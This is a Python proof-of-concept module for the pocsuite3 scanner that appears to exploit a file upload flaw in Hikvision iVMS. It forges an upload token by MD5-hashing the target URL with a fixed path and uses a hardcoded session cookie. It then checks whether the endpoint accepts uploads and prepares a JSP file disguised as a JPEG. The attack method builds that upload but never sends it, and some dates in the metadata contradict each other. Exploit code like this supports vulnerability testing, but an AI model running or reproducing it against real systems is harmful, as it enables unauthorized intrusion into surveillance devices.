# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from urllib.parse import urljoin
from pocsuite3.api import REVERSE_PAYLOAD
import hashlib
import urllib



class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["lmx"]
    vulDate = "2023-05-"
    createDate = "2023-8-"
    updateDate = "2022-8-"
    references =[""]
    name ="hkvs-ivms-fileupload"
    appPowerLink = ''
    appName = 'Hikvision'
    appVersion = ''
    vulType = 'RCE'
    desc = '''
    海康威视文件上传
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result ={}
        poc1 = '''/eps/api/resourceOperations/uploadsecretKeyIbuilding'''
        poc2 = '''/eps/api/resourceOperations/upload?token='''
        #url = self.url
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Cookie':'ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169'
                    }
        
        #md5
        hashurl = self.url + poc1
        hl = hashlib.md5()
        hl.update(hashurl.encode(encoding='utf-8'))
        hs = (hl.hexdigest()).upper()

        # 检测
        data = {"service": urllib.parse.quote(self.url + "/home/index.action")}

        try:
            r = requests.post(url=self.url + poc2 + hs, headers=headers, data=data, verify=False, timeout=10)
            if 'success' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):

        result ={}

        poc1 = '''/eps/api/resourceOperations/uploadsecretKeyIbuilding'''
        poc2 = '''/eps/api/resourceOperations/upload?token='''
        #url = self.url
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Cookie':'ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169',
                    'Content-Type' : 'multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo'
                    }
        data ='------WebKitFormBoundaryGEJwiloiPo\r\nContent-Disposition: form-data; name="fileUploader";filename="1.jsp"\r\nContent-Type: image/jpeg\r\n\r\nhkvs\r\n------WebKitFormBoundaryGEJwiloiPo'
        #md5
        hashurl = self.url + poc1
        hl = hashlib.md5()
        hl.update(hashurl.encode(encoding='utf-8'))
        hs = (hl.hexdigest()).upper()
        return self._verify()
register_poc(DemoPOC) 
